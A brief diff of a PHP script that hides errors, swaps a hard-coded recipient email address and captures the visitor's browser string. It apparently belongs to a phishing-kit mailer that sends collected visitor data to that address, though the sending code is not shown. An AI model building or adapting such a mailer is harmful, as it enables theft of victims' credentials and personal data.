@@ -3,7 +3,7 @@
 ini_set('display_errors',  false);
 
 
-$to = "elnuno@yopmail.com";
+$to = "raymondscottint@hotmail.com";
 
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
